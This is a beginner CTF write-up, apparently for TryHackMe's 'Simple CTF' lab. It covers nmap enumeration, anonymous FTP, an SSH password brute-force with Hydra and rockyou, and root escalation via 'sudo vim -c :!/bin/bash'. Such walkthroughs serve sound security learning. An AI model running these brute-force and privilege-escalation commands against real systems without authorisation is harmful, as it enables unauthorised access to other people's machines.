#  Simple CTF Write‑Up (Clean & Detailed)

##  Initial Enumeration

### Nmap Scan
```bash
nmap -sC -sV -p- 10.48.139.107
```

**Findings:**
- **21/tcp** → FTP (anonymous login allowed)  
- **80/tcp** → HTTP (CMS Made Simple web app)  
- **2222/tcp** → SSH  

---

##  FTP Enumeration

Connect anonymously:
```bash
ftp 10.48.139.107
```

List files:
```ftp
ls
cd pub
ls
```

Found **ForMitch.txt**.  

### Downloading the file
Two common beginner‑friendly methods:

- **Using `get`:**
  ```ftp
  get ForMitch.txt
  ```
  → Saves the file locally.

- **Using `less`:**
  ```ftp
  less ForMitch.txt
  ```
  → Opens the file directly inside FTP without saving.

**File contents:**
```
Dammit man... you set the same pass for the system user, and the password is so weak...
```

**Why this matters:**  
- Reveals system user **mitch**.  
- Password is weak and reused.  
- Sets up brute‑force attack on SSH.

---

##  Web Enumeration (CMS Made Simple)

Visiting `http://10.48.139.107/` shows **CMS Made Simple**.  
Known vuln: SQLi (CVE‑2019‑9053).  
But since we already know Mitch’s username and the password is weak, brute‑forcing SSH is faster.

---

##  Credential Attack

Brute‑force SSH with Hydra:
```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://10.48.139.107:2222
```

**Result:**
```
[2222][ssh] host: 10.48.139.107   login: mitch   password: secret
```

---

##  User Shell & Flag

Login:
```bash
ssh mitch@10.48.139.107 -p 2222
```
Password: `secret`

Grab user flag:
```bash
cat /home/mitch/user.txt
```
**Flag:** `G00d j0b, keep up!`

Check other users:
```bash
ls /home
```
→ Found **sunbath**

---

##  Privilege Escalation

Check sudo permissions:
```bash
sudo -l
```
**Output:**
```
(root) NOPASSWD: /usr/bin/vim
```

---

### Escalation via vim

There are two clear methods:

1. **One‑liner (recommended):**
   ```bash
   sudo vim -c ':!/bin/bash'
   ```
   → Launches vim as root and immediately executes `/bin/bash`.

2. **Inside vim (if already open):**
   - Press `:` to enter command mode.  
   - Type:
     ```
     :!/bin/bash
     ```
   - Press Enter → root shell.

**Short note for beginners:**  
When you open vim with `sudo vim`, you’ll see the editor splash screen. To escape into a shell, type `:` (colon) to enter command mode, then `!/bin/bash`. This spawns a root shell because vim is running with root privileges. To quit vim normally, type `:q`.

---

##  Root Flag

Confirm root:
```bash
whoami
```
→ `root`

Read root flag:
```bash
cat /root/root.txt
```
**Flag:** `THM{ROOT_FLAG}. YOU MADE IT`


---

##  Lessons Learned

- FTP often hides breadcrumbs; use `get` or `less` to retrieve files.  
- Hydra brute‑force is faster than patching legacy exploits when weak passwords are hinted.  
- Always check `sudo -l`; misconfigured editors like vim can spawn root shells.  
- Beginners should remember: inside vim, use `:!/bin/bash` to escape into a shell, and `:q` to quit.
